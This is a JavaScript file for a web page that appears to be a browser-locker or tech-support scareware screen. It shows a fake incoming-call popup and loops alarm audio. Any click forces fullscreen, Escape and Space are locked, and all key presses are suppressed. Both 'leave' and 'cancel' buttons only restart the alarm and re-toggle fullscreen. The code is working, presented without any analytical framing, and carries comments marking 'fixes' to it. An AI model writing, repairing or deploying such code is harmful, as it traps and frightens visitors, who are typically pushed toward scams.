/* ============================================================
   GLOBAL AUDIO FIX (PREVENT DOUBLE eng.mp3 PLAYBACK)
============================================================ */
let globalAlertAudio = null;
let globalAudioStarted = false;

function initGlobalAudio() {
    if (!globalAlertAudio) {
        globalAlertAudio = new Audio("eng.mp3");
        globalAlertAudio.loop = true;
        globalAlertAudio.volume = 1.0;
    }
}

function startGlobalAudio() {
    initGlobalAudio();

    if (!globalAudioStarted) {
        globalAlertAudio.play().catch(() => {
            console.log("Autoplay blocked until user clicks");
        });
        globalAudioStarted = true;
    }
}

/* ============================================================
   FIRST SCREEN CALL POPUP FUNCTIONALITY
============================================================ */

let firstScreenActive = true; // track first popup

function hideFirstScreen() {
    if (!firstScreenActive) return;

    firstScreenActive = false;

    const fs = document.getElementById("firstScreen");
    if (fs) fs.style.display = "none";

    const mc = document.getElementById("mainContent");
    if (mc) mc.style.display = "block";
}

// Accept / Close buttons
document.addEventListener("DOMContentLoaded", () => {
    const btn1 = document.querySelector(".accept");
    const btn2 = document.querySelector(".decline");
    const closeBtn = document.querySelector(".closeBtn");

    [btn1, btn2, closeBtn].forEach((btn) => {
        if (!btn) return;
        btn.addEventListener("click", function (e) {
            e.stopPropagation();
            hideFirstScreen();
            startGlobalAudio();
        });
    });
});

// Clicking anywhere → hide first screen and continue fullscreen behavior
document.addEventListener("click", function () {
    hideFirstScreen();
});


/* ============================================================
   YOUR ORIGINAL CODE (KEPT EXACTLY THE SAME EXCEPT AUDIO FIX)
============================================================ */

function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

$(document).ready(function () {
  var audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "alert-en.wav");

  audioElement.addEventListener(
    "ended",
    function () {
      this.play();
    },
    false
  );

  addEventListener("click", function () {

    // Hide first popup then fullscreen
    hideFirstScreen();

    var el = document.documentElement,
      reffer =
        el.requestFullScreen ||
        el.webkitRequestFullScreen ||
        el.mozRequestFullScreen;
    if (reffer) reffer.call(el);

    audioElement.play();

    // FIX: use unified eng.mp3 audio
    startGlobalAudio();
  });

  if ("keyboard" in navigator && "lock" in navigator.keyboard) {
    navigator.keyboard.lock(["Escape", "Space"]);
  } else {
    console.log("Keyboard Lock API is not supported in this browser.");
  }

  document.addEventListener(
    "keydown",
    function (event) {
      event.preventDefault();
    },
    false
  );
});

window.onload = function () {
  const dialog = document.getElementById("leaveDialog");
  const leaveBtn = document.getElementById("leaveBtn");
  const cancelBtn = document.getElementById("cancelBtn");

  // Show popup on load
  if (dialog) dialog.classList.add("ls-show");

  function toggleFullScreen() {
    let doc = document.documentElement;

    if (!document.fullscreenElement) {
      if (doc.requestFullscreen) doc.requestFullscreen();
      else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
      else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
    } else {
      if (document.exitFullscreen) document.exitFullscreen();
      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
      else if (document.msExitFullscreen) document.msExitFullscreen();
    }
  }

  // Clicking anywhere on the page
  document.addEventListener("click", function () {
    hideFirstScreen();
    startGlobalAudio();     // FIX: instead of creating new audio
    toggleFullScreen();
  });

  if (leaveBtn) {
    leaveBtn.onclick = (event) => {
      event.stopPropagation();
      dialog.classList.remove("ls-show");
      hideFirstScreen();
      startGlobalAudio();   // FIX
      toggleFullScreen();
    };
  }

  if (cancelBtn) {
    cancelBtn.onclick = (event) => {
      event.stopPropagation();
      dialog.classList.remove("ls-show");
      hideFirstScreen();
      startGlobalAudio();   // FIX
      toggleFullScreen();
    };
  }
};

/* ============================================================
   VIBRATION ANIMATION RESTART (UNCHANGED)
============================================================ */
setInterval(() => {
    const box = document.querySelector(".call-box");
    if (box) {
        box.classList.remove("shake");
        void box.offsetWidth; // restart CSS animation
        box.classList.add("shake");
    }
}, 3000);
